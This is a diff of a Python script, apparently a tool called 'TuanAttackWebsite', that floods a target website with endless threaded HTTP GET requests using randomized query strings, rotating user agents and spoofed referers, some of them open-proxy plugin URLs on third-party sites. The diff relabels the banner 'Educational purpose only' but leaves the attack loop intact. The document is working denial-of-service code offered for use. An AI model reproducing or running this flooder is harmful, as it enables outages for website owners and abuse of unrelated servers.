@@ -1,40 +1,11 @@
-
-########################################
-#       TuanAttackWebsite       #
-########################################
-
 import os
 import requests
 import threading
 import random
-import sys
-import argparse
-from colorama import Fore
-import json
-import random
 
-
-# Procura um IP aleatório
-def random_IP():
-    ip = []
-    for _ in range(0, 4):
-        ip.append(str(random.randint(1, 255)))
-    return ".".join(ip)
-
-
-# Procura uma referência aleatória
-def random_referer():
-    with open("IP/referers.txt", "r") as referers:
-        referers = referers.readlines()
-    return random.choice(referers)
-
-
-# Procura um user agent aleatório
-def random_useragent():
-    with open("IP/user_agents.json", "r") as agents:
-        user_agents = json.load(agents)["agents"]
-    return random.choice(user_agents)
-
+########################################
+#       Educational purpose only       #
+########################################
 
 if os.name == 'nt':
     os.system("cls")
@@ -49,6 +20,12 @@ count = 0
 headers = []
 referer = [
     "https://google.it/",
+    "https://facebook.com/",
+    "https://duckduckgo.com/",
+    "https://google.com/",
+    "https://youtube.com",
+    "https://yandex.com",
+        "https://google.it/",
     "https://facebook.com/",
     "https://duckduckgo.com/",
     "https://google.com/",
@@ -384,12 +361,17 @@ referer = [
      "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
      "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
      "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
-
 ]
 
 
 def useragent():
     global headers
+    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
+    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
+    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
+    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
     headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
     headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
     headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
@@ -537,7 +519,6 @@ def useragent():
         headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN")
         headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN")
         headers.append("Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
-        
 
     return headers
 
@@ -561,24 +542,23 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0} Attack Successful".format(count))
+                print ("{0} Website Error ! ".format(count))
             except requests.exceptions.ConnectionError:
-                print ("TuanCE Are Attack Website...")
+                print ("[TuanCE Are Attack Website....]")
                 pass
             except requests.exceptions.InvalidSchema:
-                print ("[Url Error]")
+                print ("[URL Error]")
                 raise SystemExit()
             except ValueError:
-                print ("[Check Your Url]")
+                print ("[Check Your URL]")
                 raise SystemExit()
             except KeyboardInterrupt:
-                print("[Canceled By User]")
+                print("[Canceled by User]")
                 raise SystemExit()
 
 
 while True:
     try:
-    
         th1 = httpth1()
         th1.start()
     except Exception:
